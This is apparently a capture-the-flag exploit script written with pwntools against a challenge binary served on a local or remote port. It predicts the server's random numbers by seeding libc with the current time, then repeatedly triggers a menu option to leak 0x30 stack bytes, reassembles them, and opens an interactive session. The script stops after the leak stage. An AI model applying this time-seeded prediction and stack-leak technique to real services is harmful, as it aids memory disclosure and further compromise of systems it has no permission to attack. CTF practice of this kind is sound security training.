#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from ctypes import *

exe = context.binary = ELF(args.EXE or './deploy/prob')
lib = ELF(args.EXE or 'libc.so.6')

cdll.LoadLibrary("libc.so.6")
libc = CDLL("libc.so.6")

host = args.HOST or 'localhost'
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

# sync time on server
seed = libc.time(0)
libc.srand(seed)
log.info("current time: %d" % (seed))

visited = dict()
while len(visited) < 0x30:
    idx = libc.rand() % 0x30
    
    io.sendlineafter(b">", b"2")
    line = io.recvline().strip().decode()
    visited[idx] = int(line, 16)
    
    print(visited)
    
leaked_stack01 = "".join([hex(visited[i])[2:].rjust(2, "0") for i in range(0x30)][::-1])

print(leaked_stack01)

io.interactive()

